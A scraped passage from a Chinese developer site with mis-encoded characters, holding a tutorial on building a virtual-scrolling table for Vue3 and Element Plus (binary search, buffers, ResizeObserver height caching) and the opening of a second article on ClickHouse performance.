                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯<strong>å‰ç«¯æ¶æ„å¸ˆ</strong>ï¼Œå…³æ³¨å¾®ä¿¡å…¬ä¼—å·ã€<strong>ç¨‹åºå‘˜å¤§å«</strong>ã€‘ï¼Œå…è´¹é¢†å–ç²¾å“å‰ç«¯èµ„æ–™ã€‚</p>
<h2 data-id="heading-0">èƒŒæ™¯</h2>
<p>æœ¬æ–‡å°†åŸºäº <strong>Vue3 + Element Plus</strong>ï¼Œå®ç°ä¸€ä¸ª<strong>å®Œå…¨è‡ªå®šä¹‰çš„è™šæ‹Ÿæ»šåŠ¨è¡¨æ ¼æ–¹æ¡ˆ</strong>ï¼Œæ”¯æŒä¸ç­‰é«˜è¡Œã€ç¼“å­˜é«˜åº¦ã€ç¼“å†²åŒºæ¸²æŸ“ï¼Œå¹¶ä¸”ä¸ <code>el-table</code> è§£è€¦ã€‚</p>
<blockquote>
<p>Element Plus è™½ç„¶æä¾›äº†è™šæ‹Ÿæ»šåŠ¨ï¼Œä½†ç›®å‰è¿˜æ˜¯<a href="https://link.juejin.cn?target=https%3A%2F%2Felement-plus.org%2Fzh-CN%2Fcomponent%2Ftable-v2" target="_blank" title="https://element-plus.org/zh-CN/component/table-v2" ref="nofollow noopener noreferrer">æµ‹è¯•(beta)é˜¶æ®µ</a>ï¼Œæ‰€ä»¥æš‚æ—¶å…ˆæ²¡ç”¨äº†ï¼Œå…¶å®å½“æ—¶å†™è¿™ä¸ªç»„ä»¶ä¸»è¦æ˜¯ä¸ºäº†ç»™ <code>Element UI</code> ä½¿ç”¨çš„ã€‚</p>
</blockquote>
<h2 data-id="heading-1">ä¸€ã€å¦‚ä½•ä½¿ç”¨</h2>
<p>åœ¨å®é™…ä¸šåŠ¡ä¸­ï¼Œå¦‚æœä½ æ­£åœ¨ä½¿ç”¨ <strong>Element Plus çš„ el-table</strong>ï¼Œåˆé‡åˆ°äº†<strong>å¤§æ•°æ®é‡å¯¼è‡´æ»šåŠ¨å¡é¡¿çš„é—®é¢˜</strong>ï¼Œé‚£ä¹ˆè¿™ä¸ªç»„ä»¶å¯ä»¥åœ¨<strong>ä¸æ”¹ el-table ä»»ä½•ä»£ç </strong>çš„å‰æä¸‹ï¼Œä¸ºè¡¨æ ¼æä¾›ä¸€å¥—<strong>é«˜æ€§èƒ½çš„è™šæ‹Ÿæ»šåŠ¨èƒ½åŠ›</strong>ã€‚</p>
<p>ä½¿ç”¨æ–¹å¼éå¸¸ç®€å•ï¼šåªéœ€è¦ç”¨ <code>VirtualListTable</code> åŒ…ä¸€å±‚ <code>el-table</code>ï¼Œå¹¶é€šè¿‡ <code>change</code> äº‹ä»¶æ¥æ”¶å½“å‰éœ€è¦æ¸²æŸ“çš„æ•°æ®å³å¯ã€‚</p>
<ul>
<li><code>VirtualListTable</code> è´Ÿè´£æ»šåŠ¨ã€è®¡ç®—å¯è§†åŒºå’Œç¼“å†²åŒºæ•°æ®ï¼Œ</li>
<li><code>el-table</code> åªè´Ÿè´£å±•ç¤ºå½“å‰è¿™ä¸€å°æ®µæ•°æ®ï¼ŒäºŒè€…å®Œå…¨è§£è€¦ã€‚</li>
</ul>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">VertualListTable</span> <span class="hljs-attr">:list-data</span>=<span class="hljs-string">"tableBigData"</span> @<span class="hljs-attr">change</span>=<span class="hljs-string">"renderVirtualData"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">TableBigData</span> <span class="hljs-attr">:data</span>=<span class="hljs-string">"tableRenderData"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">VertualListTable</span>&gt;</span>
</code></pre>
<h2 data-id="heading-2">äºŒã€VirtualListTable æ ¸å¿ƒå®ç°è§£æ</h2>
<h3 data-id="heading-3">1ï¸âƒ£ è™šæ‹Ÿæ»šåŠ¨çš„å…³é”®å˜é‡</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> start = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>);                 <span class="hljs-comment">// å½“å‰èµ·å§‹ç´¢å¼•</span>
<span class="hljs-keyword">const</span> cacheHeight = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();        <span class="hljs-comment">// è¡Œé«˜ç¼“å­˜</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">positions</span>: <span class="hljs-title class_">Positions</span> = [];        <span class="hljs-comment">// æ¯ä¸€è¡Œçš„ä½ç½® &amp; é«˜åº¦</span>
<span class="hljs-keyword">let</span> scrollTop = <span class="hljs-number">0</span>;
</code></pre>
<p><code>positions</code> çš„ç»“æ„ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">{
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span> | <span class="hljs-built_in">string</span>,
  <span class="hljs-attr">height</span>: <span class="hljs-built_in">number</span>,
  <span class="hljs-attr">top</span>: <span class="hljs-built_in">number</span>
}
</code></pre>
<p>è¿™æ˜¯æ•´ä¸ªè™šæ‹Ÿæ»šåŠ¨çš„â€œåœ°å›¾â€ã€‚</p>
<h3 data-id="heading-4">2ï¸âƒ£ å¯è§†åŒºæ•°æ®è®¡ç®—ï¼ˆå« bufferï¼‰</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> visibleCount = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span>
  <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(props.<span class="hljs-property">height</span> / props.<span class="hljs-property">estimatedItemSize</span>)
);

<span class="hljs-keyword">const</span> visibleData = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> startIndex = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(start.<span class="hljs-property">value</span> - props.<span class="hljs-property">bufferCount</span>, <span class="hljs-number">0</span>);
  <span class="hljs-keyword">const</span> endIndex = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(
    start.<span class="hljs-property">value</span> + visibleCount.<span class="hljs-property">value</span> + props.<span class="hljs-property">bufferCount</span>,
    props.<span class="hljs-property">listData</span>.<span class="hljs-property">length</span>,
  );
  <span class="hljs-keyword">return</span> props.<span class="hljs-property">listData</span>.<span class="hljs-title function_">slice</span>(startIndex, endIndex);
});
</code></pre>
<p>ä¸ºä»€ä¹ˆè¦ bufferï¼Ÿ</p>
<ul>
<li>é˜²æ­¢æ»šåŠ¨æ—¶ç™½å±</li>
<li>æå‰æ¸²æŸ“ä¸Šä¸‹ç¼“å†²åŒºåŸŸï¼Œæå‡ä½“éªŒ</li>
</ul>
<h3 data-id="heading-5">3ï¸âƒ£ æ»šåŠ¨æ—¶å¦‚ä½•å¿«é€Ÿå®šä½èµ·å§‹ç´¢å¼•ï¼ˆå…³é”®ï¼‰</h3>
<p>è¿™é‡Œä½¿ç”¨çš„æ˜¯ <strong>äºŒåˆ†æŸ¥æ‰¾</strong>ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">getStartIndex</span> = (<span class="hljs-params">list: Positions, scrollTop: <span class="hljs-built_in">number</span></span>) =&gt; {
  <span class="hljs-keyword">let</span> index = <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">let</span> low = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">let</span> high = list.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;

  <span class="hljs-keyword">while</span> (low &lt;= high) {
    <span class="hljs-keyword">const</span> mid = low + ((high - low) &gt;&gt; <span class="hljs-number">1</span>);
    <span class="hljs-keyword">const</span> midVal = list[mid]?.<span class="hljs-property">top</span>;
    <span class="hljs-keyword">if</span> (midVal &lt;= scrollTop) {
      index = mid;
      low = mid + <span class="hljs-number">1</span>;
    } <span class="hljs-keyword">else</span> {
      high = mid - <span class="hljs-number">1</span>;
    }
  }
  <span class="hljs-keyword">return</span> index ?? <span class="hljs-number">0</span>;
};
</code></pre>
<p>æ—¶é—´å¤æ‚åº¦ä» <strong>O(n)</strong> é™åˆ° <strong>O(log n)</strong>ï¼Œåœ¨å¤§æ•°æ®é‡ä¸‹éå¸¸å…³é”®ã€‚</p>
<h3 data-id="heading-6">4ï¸âƒ£ ä½¿ç”¨ transform æ§åˆ¶çœŸå® DOM åç§»</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">setStartOffset</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> index = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(start.<span class="hljs-property">value</span> - props.<span class="hljs-property">bufferCount</span>, <span class="hljs-number">0</span>);
  <span class="hljs-keyword">const</span> offset = positions[index]?.<span class="hljs-property">top</span> ?? <span class="hljs-number">0</span>;
  contentRef.<span class="hljs-property">value</span>!.<span class="hljs-property">style</span>.<span class="hljs-property">transform</span> =
    <span class="hljs-string">`translate3d(0, <span class="hljs-subst">${offset}</span>px, 0)`</span>;
};
</code></pre>
<ul>
<li>ä¸æ“ä½œ <code>top</code></li>
<li>ä½¿ç”¨ <code>transform</code>ï¼Œé¿å…è§¦å‘é‡æ’</li>
<li>GPU åŠ é€Ÿï¼Œæ»šåŠ¨æ›´é¡ºæ»‘</li>
</ul>
<h3 data-id="heading-7">5ï¸âƒ£ ä¸ç­‰é«˜è¡Œçš„æ ¸å¿ƒï¼šé«˜åº¦ç¼“å­˜ + ResizeObserver</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">updateItemsSize</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-title function_">getNodes</span>().<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">node</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">getNodeId</span>(node);
    <span class="hljs-keyword">const</span> height = node.<span class="hljs-title function_">getBoundingClientRect</span>().<span class="hljs-property">height</span>;
    cacheHeight.<span class="hljs-title function_">set</span>(id, height);
  });
};
</code></pre>
<p>ç»“åˆ <code>ResizeObserver</code>ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">ro = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResizeObserver</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (ignoreResize) <span class="hljs-keyword">return</span>;
  <span class="hljs-title function_">updateLayout</span>();
});
</code></pre>
<p>è§£å†³çš„é—®é¢˜ï¼š</p>
<ul>
<li>è¡¨æ ¼è¡Œé«˜åº¦åŠ¨æ€å˜åŒ–</li>
<li>æ–‡æœ¬æ¢è¡Œã€slot å˜åŒ–</li>
<li>ä¸éœ€è¦å¼ºåˆ¶å›ºå®šè¡Œé«˜</li>
</ul>
<h3 data-id="heading-8">6ï¸âƒ£ å ä½å…ƒç´ æ’‘å¼€æ»šåŠ¨æ¡</h3>
<p>è¿™æ˜¯è™šæ‹Ÿæ»šåŠ¨ä¸­<strong>æœ€æ ¸å¿ƒçš„ä¸€æ­¥</strong>ï¼šDOM åªæ¸²æŸ“å‡ åè¡Œï¼Œä½†æ»šåŠ¨æ¡çœ‹èµ·æ¥åƒæœ‰å‡ åƒè¡Œ</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"placeholder"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"placeholder"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">updateTotalHeight</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> lastItem = positions.<span class="hljs-title function_">at</span>(-<span class="hljs-number">1</span>);
  placeholderRef.<span class="hljs-property">value</span>!.<span class="hljs-property">style</span>.<span class="hljs-property">height</span> =
    (lastItem.<span class="hljs-property">top</span> + lastItem.<span class="hljs-property">height</span>) + <span class="hljs-string">'px'</span>;
};
</code></pre>
<h2 data-id="heading-9">ä¸‰ã€ä¸ el-table çš„æ— ä¾µå…¥èåˆ</h2>
<ul>
<li>ä¸æ”¹ el-table æºç </li>
<li>åªæ¥ç®¡æ»šåŠ¨å®¹å™¨</li>
<li>æ‰€æœ‰è¡¨æ ¼åŠŸèƒ½ç…§å¸¸ä½¿ç”¨ï¼ˆæ’åºã€åˆ—ã€æ ·å¼ï¼‰</li>
</ul>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">initElement</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> $wrapper = containerRef.<span class="hljs-property">value</span>
    ?.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.el-table__body-wrapper'</span>);
  <span class="hljs-keyword">const</span> $tableBody = $wrapper
    ?.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.el-scrollbar'</span>);

  contentRef.<span class="hljs-property">value</span>?.<span class="hljs-title function_">appendChild</span>($tableBody);
  $wrapper?.<span class="hljs-title function_">appendChild</span>(scrollBoxRef.<span class="hljs-property">value</span>!);
};
</code></pre>
<h2 data-id="heading-10">å››ã€TableBigDataï¼šä¿æŒçº¯å±•ç¤º</h2>
<pre><code class="hljs language-vue" lang="vue">&lt;el-table :data="data"&gt;
  &lt;el-table-column prop="name" label="Name" /&gt;
  &lt;el-table-column prop="email" label="Email" /&gt;
&lt;/el-table&gt;
</code></pre>
<h2 data-id="heading-11">äº”ã€æ€»ç»“</h2>
<h3 data-id="heading-12">1. è¿™ä¸ªæ–¹æ¡ˆé€‚åˆä»€ä¹ˆåœºæ™¯</h3>
<ul>
<li>è¶…å¤§æ•°æ®é‡è¡¨æ ¼ï¼ˆ1000+ï¼‰</li>
<li>è¡Œé«˜ä¸å›ºå®š</li>
<li>è€é¡¹ç›® + Element Plus</li>
<li>å¯¹æ»šåŠ¨æ€§èƒ½è¦æ±‚é«˜</li>
</ul>
<h3 data-id="heading-13">2. æ–¹æ¡ˆä¼˜åŠ¿</h3>
<ul>
<li>æ”¯æŒä¸ç­‰é«˜è¡Œ</li>
<li>ä¸ el-table è§£è€¦</li>
<li>äºŒåˆ†æŸ¥æ‰¾é«˜æ€§èƒ½</li>
<li>buffer é˜²ç™½å±</li>
<li>ResizeObserver è‡ªåŠ¨ä¿®æ­£</li>
</ul>
<blockquote>
<p>æºç : <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzm8%2Fwechat-oa%2Ftree%2Fmain%2Fexamples%2Fvue3-virtual-table" target="_blank" title="https://github.com/zm8/wechat-oa/tree/main/examples/vue3-virtual-table" ref="nofollow noopener noreferrer">github.com/zm8/wechat-â€¦</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ¯”MySQLå¿«800å€çš„æ•°æ®åº“ï¼šClickHouseçš„æ€§èƒ½ç§˜å¯†]]></title>    <link>https://juejin.cn/post/7604409112592449546</link>    <guid>https://juejin.cn/post/7604409112592449546</guid>    <pubDate>2026-02-09T07:26:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604409112592449546" data-draft-id="7604409112592433162" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ¯”MySQLå¿«800å€çš„æ•°æ®åº“ï¼šClickHouseçš„æ€§èƒ½ç§˜å¯†"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-02-09T07:26:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¥å¥‡å°æ±¤åœ†"/> <meta itemprop="url" content="https://juejin.cn/user/1151943919285431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ¯”MySQLå¿«800å€çš„æ•°æ®åº“ï¼šClickHouseçš„æ€§èƒ½ç§˜å¯†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1151943919285431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¥å¥‡å°æ±¤åœ†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T07:26:00.000Z" title="Mon Feb 09 2026 07:26:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<blockquote>
<p>å½“ä¼ ç»Ÿæ•°æ®åº“åœ¨å¤„ç†äº¿çº§æ•°æ®æŸ¥è¯¢æ—¶é™·å…¥æ€§èƒ½ç“¶é¢ˆï¼Œä¸€å®¶ä¿„ç½—æ–¯äº’è”ç½‘å·¨å¤´å´é»˜é»˜å¼€å‘å‡ºäº†ä¸€æ¬¾èƒ½æ¯”Verticaå¿«5å€ã€æ¯”MySQLå¿«800å€çš„åˆ†æå‹æ•°æ®åº“ã€‚</p>
</blockquote>
<p>â€œæ¯å¤©å¤„ç†è¶…è¿‡1000äº¿æ¡è®°å½•ï¼Œæ”¯æŒè¿‘400å°æœåŠ¡å™¨é›†ç¾¤ï¼Œå†å²æ€»è®°å½•è¶…è¿‡13ä¸‡äº¿æ¡ã€‚â€è¿™æ˜¯<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D267917811%26content_type%3DArticle%26match_order%3D1%26q%3DClickHouse%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=267917811&amp;content_type=Article&amp;match_order=1&amp;q=ClickHouse&amp;zhida_source=entity" ref="nofollow noopener noreferrer">ClickHouse</a>åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D267917811%26content_type%3DArticle%26match_order%3D1%26q%3DYandex.Metrica%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=267917811&amp;content_type=Article&amp;match_order=1&amp;q=Yandex.Metrica&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Yandex.Metrica</a>ä¸­çš„å®é™…åº”ç”¨è§„æ¨¡ã€‚</p>
